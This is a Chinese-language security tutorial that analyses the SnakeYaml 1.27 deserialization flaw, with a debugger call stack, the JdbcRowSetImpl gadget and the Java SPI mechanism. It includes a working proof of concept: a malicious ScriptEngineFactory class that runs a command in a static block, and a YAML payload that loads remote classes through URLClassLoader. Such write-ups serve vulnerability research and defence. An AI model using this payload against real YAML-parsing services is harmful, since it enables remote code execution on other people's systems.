## 简介
SnakeYaml 是一个用于解析 YAML（Yet Another Markup Language）格式数据的 Java 类库。它提供了 `dump` 方法，可以将 Java 对象转换为 YAML 格式的字符串；同时，其 `load` 方法能够将 YAML 字符串转换回 Java 对象。在对象与字符串之间的转换过程中，SnakeYaml 采用了自定义的序列化和反序列化机制，类似于 FastJson 和 Jackson 等组件。如本文有任何错误之处，恳请指正。

## 漏洞利用
你可以通过 Maven 导入 SnakeYaml 依赖：

```xml
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.27</version>
</dependency>
```

以下是一个简单的 JNDI 注入示例：

```java
// 示例代码
```

## 漏洞分析
从 `org.yaml.snakeyaml.Yaml#load` 方法开始进行动态调试。该方法调用重载方法并实例化 `StreamReader` 对象。初始化操作后，重点关注 `getSingleData` 方法。接下来，`BaseConstructor#constructDocument` 方法被调用，并传入包含解析后的 YAML 字符串信息的 Node 对象。

通过 Node 对象的 `getTag` 方法获取 Tag 对象，再调用 `getClassName` 方法获取 YAML 字符串中的类名。`Constructor#getClassForName` 方法进一步获取类的 Class 对象，而 `Class#forName` 方法则用于实际获取类对象。

在 `Constructor$ConstructMapping#construct` 方法中，会调用父类 `BaseConstructor#newInstance` 方法。该方法通过 `JdbcRowSetImpl` 类的 Class 获取无参构造器，并调用 `newInstance` 方法返回实例对象。

继续跟进到 `Constructor$ConstructMapping#constructJavaBean2ndStep` 方法，其中 `property.set` 是关键步骤。`getWriteMethod` 方法返回属性对应的 setter 方法的 Method 对象，然后通过调用 Method 对象的 `invoke` 方法来设置 JavaBean 的属性值。

以下是相关调用栈的部分内容：
```plaintext
:66, MethodProperty (org.yaml.snakeyaml.introspector)
getPropertiesMap:88, PropertyUtils (org.yaml.snakeyaml.introspector)
getProperty:152, PropertyUtils (org.yaml.snakeyaml.introspector)
getProperty:148, PropertyUtils (org.yaml.snakeyaml.introspector)
getProperty:309, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)
constructJavaBean2ndStep:230, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)
construct:171, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)
construct:331, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)
constructObjectNoCheck:229, BaseConstructor (org.yaml.snakeyaml.constructor)
constructObject:219, BaseConstructor (org.yaml.snakeyaml.constructor)
constructDocument:173, BaseConstructor (org.yaml.snakeyaml.constructor)
getSingleData:157, BaseConstructor (org.yaml.snakeyaml.constructor)
loadFromReader:490, Yaml (org.yaml.snakeyaml)
load:416, Yaml (org.yaml.snakeyaml)
main:9, YamlTest (org.vulhub.yaml)
```

`JdbcRowSetImpl` 的 Gadget 会在其 `autoCommit` 属性的 setter 方法中触发。此外，SnakeYaml 反序列化还存在其他经典 Gadget，例如使用 SPI 机制加载远程 Jar 包或 class 文件。

## SPI
Java SPI（Service Provider Interface）机制是一种服务提供发现机制。当服务提供者实现了一个接口后，需要在 `classpath` 下的 `META-INF/services` 目录中创建一个以服务接口命名的文件，文件内容为接口的具体实现类。客户端程序可以通过查找 `META-INF/services` 中的配置文件来加载相应的实现类。

这种机制主要用于解耦模块中的硬编码实现类，通过配置文件的方式实现动态加载。例如，在 JDBC 使用场景中，你可以在 `META-INF/services` 目录下创建 `Driver` 文件，并在文件中指定要加载的数据库驱动实现类。这种方式不仅实现了动态加载，还避免了在程序代码中硬编码实现类。当你需要更换数据库驱动时，只需更新配置文件即可。

## SPI 与 ScriptEngineManager
首先给出 Payload 和利用方法。编写一个恶意类实现 `ScriptEngineFactory` 接口，并在静态代码块中添加命令执行代码：

```java
public class Poc implements ScriptEngineFactory {
    public static void main(String[] args) {}
    
    static {
        try {
            Runtime.getRuntime().exec("open /System/Applications/Calculator.app");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return "Poc";
    }

    // 其他必要的方法实现
}
```

将编译后的 class 文件放置在 Web 服务目录下，并在 Web 服务根目录下新建 `META-INF/services/javax.script.ScriptEngineFactory` 文件，文件内容为 `Poc`。

Payload 如下：
```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!java.net.URL ["url"]]]]
```

上述 Payload 从右向左解析，首先调用 `java.net.URL` 的 `public URL(String spec)` 构造器初始化对象，然后将该 URL 对象传递给 `java.net.URLClassLoader` 的 `public URLClassLoader(URL[] urls)` 构造器。最后，调用 `javax.script.ScriptEngineManager` 的 `public ScriptEngineManager(URLClassLoader loader)` 构造器。

打开 URL 流并获取加载的类名（即 `javax.script.ScriptEngineFactory` 文件的内容）。在 `java.util.ServiceLoader#nextService` 方法中，通过 `Class.forName` 从 URL 加载远程服务器上的类（因为 `loader` 是 `URLClassLoader`），并触发静态代码块中的命令执行，弹出计算器。

需要注意的是，`Class.forName` 的第二个参数为 `false`，因此静态代码块不会在此处执行，而是在调用 `newInstance` 方法时执行。

## 参考
- [Java SnakeYaml 反序列化漏洞](https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E)
- [Java 常用机制 - SPI 机制详解 | Java 全栈知识体系](https://www.pdai.tech/md/java/advanced/java-advanced-spi.html#java%e5%b8%b8%e7%94%a8%e6%9c%ba%e5%88%b6---spi%e6%9c%ba%e5%88%b6)